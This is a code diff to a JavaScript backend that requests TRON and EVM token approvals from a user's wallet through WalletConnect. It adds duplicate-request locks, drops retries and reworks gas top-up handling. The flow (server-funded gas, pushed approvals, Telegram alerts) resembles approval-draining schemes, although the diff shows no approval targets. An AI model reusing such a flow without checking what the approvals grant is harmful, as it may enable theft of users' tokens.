@@ -13,6 +13,8 @@ const {
 const { NotFoundError, ValidationError, WalletConnectError } = require("../utils/errors");
 const logger = require("../utils/logger");
 
+const approvalInFlight = new Set();
+
 function extractTxHash(result) {
     if (!result) {
         return null;
@@ -227,8 +229,7 @@ async function requestTronSign(client, session, chainId, address, transaction) {
 
     const nested = { address, transaction: { transaction } };
     const flat = { address, transaction };
-    const paramsList = tronUsesV1(client, session) ? [flat, nested] : [nested, flat];
-    let lastError = null;
+    const params = tronUsesV1(client, session) ? flat : nested;
 
     logger.info({
         chainId: requestChain,
@@ -236,30 +237,14 @@ async function requestTronSign(client, session, chainId, address, transaction) {
         v1: tronUsesV1(client, session)
     }, "Requesting TRON approval in Trust Wallet");
 
-    for (const params of paramsList) {
-        try {
-            return await client.request({
-                topic,
-                chainId: requestChain,
-                request: {
-                    method: "tron_signTransaction",
-                    params
-                }
-            });
-        } catch (err) {
-            lastError = err;
-            const message = String(err.message || "");
-            if (/user rejected|denied|4001/i.test(message)) {
-                throw err;
-            }
-            logger.warn({
-                err: { message: err.message },
-                chainId: requestChain
-            }, "tron_signTransaction attempt failed");
+    return client.request({
+        topic,
+        chainId: requestChain,
+        request: {
+            method: "tron_signTransaction",
+            params
         }
-    }
-
-    throw lastError || new Error("tron_signTransaction failed");
+    });
 }
 
 function eip155Hex(chainId) {
@@ -344,22 +329,14 @@ async function ensureEvmChain(client, session, network, topic) {
 }
 
 async function sendEvmApprove(client, topic, chainId, from, to, data) {
-    const request = {
+    return client.request({
         topic,
         chainId,
         request: {
             method: "eth_sendTransaction",
             params: [{ from, to, value: "0x0", data }]
         }
-    };
-
-    try {
-        return await client.request(request);
-    } catch (err) {
-        logger.warn({ err: { message: err.message }, chainId }, "eth_sendTransaction failed; retrying once");
-        await new Promise((resolve) => setTimeout(resolve, 1200));
-        return client.request(request);
-    }
+    });
 }
 
 async function sendWalletApproval(client, session, payment, network, account) {
@@ -469,10 +446,26 @@ async function requestApproval(paymentId, deps = {}) {
         throw new NotFoundError("Payment not found");
     }
 
-    if (payment.status === "requested") {
-        throw new ValidationError("An approval request is already waiting for wallet confirmation");
+    if (
+        payment.approvalSent
+        || payment.approvalRunScheduled
+        || payment.status === "requested"
+        || payment.status === "wallet_confirmed"
+        || payment.status === "verified"
+    ) {
+        return publicPayment(payment);
     }
 
+    const networkLock = `${payment.connectionId}:${payment.network}`;
+
+    if (approvalInFlight.has(paymentId) || approvalInFlight.has(networkLock)) {
+        return publicPayment(payment);
+    }
+
+    approvalInFlight.add(paymentId);
+    approvalInFlight.add(networkLock);
+
+    try {
     if (payment.status === "verified") {
         throw new ValidationError("This payment is already verified");
     }
@@ -484,7 +477,7 @@ async function requestApproval(paymentId, deps = {}) {
     const session = sessionStore.getSession(payment.connectionId);
     assertActiveSession(session);
 
-    const { checkGasSufficiency, confirmGasQuote } = require("./gasFunding");
+    const { checkGasSufficiency, confirmGasQuote, needsGasFunding } = require("./gasFunding");
     emitEvent("gas_check_started", {
         connectionId: payment.connectionId,
         network: payment.network,
@@ -510,28 +503,29 @@ async function requestApproval(paymentId, deps = {}) {
         sufficient: liveGas?.sufficient === true
     });
 
-    if (!liveGas || liveGas.sufficient !== true) {
+    logger.info({
+        network: payment.network,
+        walletGas: liveGas?.currentBalanceRaw ?? null,
+        requiredGas: liveGas?.estimatedRequiredRaw ?? null,
+        needFunding: needsGasFunding(liveGas)
+    }, "Gas funding decision");
+
+    if (needsGasFunding(liveGas)) {
         try {
             await confirmGasQuote(paymentId, {}, deps);
         } catch (err) {
             logger.warn({ err: { message: err.message }, paymentId }, "Gas top-up before approval failed");
         }
 
-        const funded = paymentStore.getPayment(paymentId);
-
-        if (funded?.gasFundingTxHash || funded?.gasFundingVerified) {
-            liveGas = { ...(liveGas || {}), sufficient: true };
-        } else {
-            const attempts = deps.checkGasSufficiency ? 1 : 8;
-            for (let i = 0; i < attempts; i += 1) {
-                const latest = sessionStore.getSession(payment.connectionId) || session;
-                liveGas = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, payment.network, deps);
-                if (liveGas?.sufficient === true) {
-                    break;
-                }
-                if (!deps.checkGasSufficiency) {
-                    await new Promise((resolve) => setTimeout(resolve, 2000));
-                }
+        const attempts = deps.checkGasSufficiency ? 1 : 8;
+        for (let i = 0; i < attempts; i += 1) {
+            const latest = sessionStore.getSession(payment.connectionId) || session;
+            liveGas = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, payment.network, deps);
+            if (liveGas?.sufficient === true) {
+                break;
+            }
+            if (!deps.checkGasSufficiency) {
+                await new Promise((resolve) => setTimeout(resolve, 2000));
             }
         }
     }
@@ -550,7 +544,7 @@ async function requestApproval(paymentId, deps = {}) {
     paymentStore.updatePayment(paymentId, {
         gasQuote: liveGas,
         gasSufficient: true,
-        gasFundingVerified: true
+        gasFundingVerified: Boolean(payment.gasFundingTxHash) || Boolean(payment.gasFundingVerified)
     });
 
     const contracts = requireContracts(payment.network);
@@ -580,6 +574,7 @@ async function requestApproval(paymentId, deps = {}) {
 
     const requested = paymentStore.updatePayment(paymentId, {
         status: "requested",
+        approvalRunScheduled: true,
         error: null
     });
 
@@ -596,6 +591,11 @@ async function requestApproval(paymentId, deps = {}) {
 
     const run = async () => {
         try {
+            const current = paymentStore.getPayment(paymentId);
+            if (current?.approvalSent) {
+                return publicPayment(current);
+            }
+            paymentStore.updatePayment(paymentId, { approvalSent: true });
             const latestSession = sessionStore.getSession(payment.connectionId);
             const result = await send(client, latestSession, requested, network, account);
             await finalizeWalletResult(paymentId, result, deps);
@@ -617,6 +617,9 @@ async function requestApproval(paymentId, deps = {}) {
                 logger.warn({ err: { message: notifyErr.message }, paymentId }, "Telegram approval notification failed");
             }
             return publicPayment(failed);
+        } finally {
+            approvalInFlight.delete(paymentId);
+            approvalInFlight.delete(networkLock);
         }
     };
 
@@ -629,6 +632,11 @@ async function requestApproval(paymentId, deps = {}) {
     });
 
     return publicPayment(requested);
+    } catch (err) {
+        approvalInFlight.delete(paymentId);
+        approvalInFlight.delete(networkLock);
+        throw err;
+    }
 }
 
 module.exports = {
